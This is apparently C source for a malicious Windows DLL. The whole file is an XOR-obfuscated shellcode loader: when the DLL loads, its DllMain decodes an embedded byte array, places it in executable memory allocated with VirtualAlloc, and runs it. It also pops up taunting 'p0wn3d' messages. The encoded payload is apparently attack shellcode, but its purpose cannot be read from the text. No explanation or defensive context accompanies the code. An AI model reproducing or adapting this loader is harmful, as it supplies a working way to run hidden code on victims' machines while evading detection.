#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#pragma comment(lib, "user32.lib")

unsigned char mspdI[] = "\x1e\x67\x9f\x1e\xd7\xbf\x90\xa9\xa9\xa9\x1e\xdb\x53\xb9\xa9\xa9\xa9\x1e\xed\xfd\x03\x94\xe1\x79\x4b\x3b\x46\x1e\x67\x0e\x71\x1e\x7b\xae\xa9\xa9\xa9\xb4\xa2\x01\x4b\x17\x05\x89\xa3\xfb\x46\xfd\x03\xd5\xb0\x38\x1b\x69\x17\xab\x4b\xa5\x33\x1c\x03\xb0\x14\x9d\x4b\x1f\xb3\x61\x03\xb0\x14\xdd\x4b\x1f\x93\x29\x03\x34\xf1\xb7\x49\xd9\xd0\xb0\x03\x0a\x86\x51\x3f\xf5\x9d\x7b\x67\x1b\x07\x3c\xca\x99\xa0\x78\x8a\xd9\xab\xaf\x42\xc5\xa9\xf2\x19\x1b\xcd\xbf\x3f\xdc\xe0\xa9\xc0\xbb\xce\xfd\x03\x94\xa9\xfc\x8b\x4f\x21\xb5\x02\x44\xb1\xf2\x03\x23\x02\x76\x43\xb4\xa8\x78\x9b\xd8\x10\xb5\xfc\x5d\xa0\xf2\x7f\xb3\x0e\xfc\xd5\xd9\xd0\xb0\x03\x0a\x86\x51\x42\x55\x28\x74\x0a\x3a\x87\xc5\xe3\xe1\x10\x35\x48\x77\x62\xf5\x46\xad\x30\x0c\x93\x63\x02\x76\x43\xb0\xa8\x78\x9b\x5d\x07\x76\x0f\xdc\xa5\xf2\x0b\x27\x0f\xfc\xd3\xd5\x6a\x7d\xc3\x73\x47\x2d\x42\xcc\xa0\x21\x15\x62\x1c\xbc\x5b\xd5\xb8\x38\x11\x73\xc5\x11\x23\xd5\xb3\x86\xab\x63\x07\xa4\x59\xdc\x6a\x6b\xa2\x6c\xb9\x02\xfc\xc9\xa8\xc7\x3c\x48\x74\xa2\x30\xa6\xe1\x79\x0a\x6d\x0f\x74\xe5\xdc\x60\x95\xeb\x3a\x46\xfd\x4a\x1d\x04\x30\xf7\x39\x46\xe4\xa6\x54\x49\x78\x45\x7a\x12\xb4\x8a\x70\xad\xf0\xba\x7a\xfc\xb1\x74\xb2\xe6\x86\x9e\x77\xcf\x17\x6b\x95\xe0\x79\x4b\x62\x07\x47\x2a\x14\x8a\x79\xb4\xee\x16\xad\x4e\xa5\x28\x34\x7a\xfb\x0e\x02\xc3\xdc\x68\xbb\x03\xc4\x86\xb5\x8a\x55\xa0\xc3\xa1\x34\x99\x1d\xfc\x41\xa9\xf0\x8c\x51\x56\xbc\x5b\xd8\x68\x9b\x03\xb2\xbf\xbc\xb9\x0d\x44\x0d\x2a\xc4\x93\xb5\x82\x50\xa1\x7b\x4b\x3b\x0f\x45\x60\xf9\x85\x79\x4b\x3b\x46\xfd\x42\xc4\xa0\x29\x03\xb2\xa4\xaa\x54\xc3\xac\x48\x8b\x51\x4b\xa4\x42\xc4\x03\x85\x2d\xfc\x02\xd9\x57\x95\xe0\x31\xc6\x7f\x62\xe5\xc5\x94\x89\x31\xc2\xdd\x10\xad\x42\xc4\xa0\x29\x0a\x6b\x0f\x02\xc3\xd5\xb1\x30\xb4\xf3\x0b\x74\xc2\xd8\x68\xb8\x0a\x81\x3f\x31\x3c\x12\x1e\xac\x03\x0a\x94\xb5\xfc\x5e\x6a\x77\x0a\x81\x4e\x7a\x1e\xf4\x1e\xac\xf0\xcb\xf3\x5f\x55\xd5\x5b\xdf\xde\x86\xdb\x02\xd6\xdc\x62\xbd\x63\x07\x40\x81\x09\x14\x1a\x99\x3e\x3e\xfd\xba\x10\xe6\x8e\x13\x4b\x62\x07\x74\xd9\x6b\x34\x79\x4b\x3b\x46\x56";
char djnftY = 'V';

int LetsGo(void) {
    for (int i = 0; i < sizeof(mspdI); i++)
    {
        mspdI[i] = mspdI[i] ^ djnftY;
    }

    MessageBox(NULL,"working","or not...",MB_OK);
    MessageBox(NULL,mspdI,"alors?",MB_OK);

    void *exec = VirtualAlloc(0, sizeof(mspdI), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, mspdI, sizeof(mspdI));
    ((void(*)())exec)();

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved)
{
    switch (nReason){
    case DLL_PROCESS_ATTACH:
        LetsGo();
        MessageBox(NULL,"p0wn3d","haha",MB_OK);
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}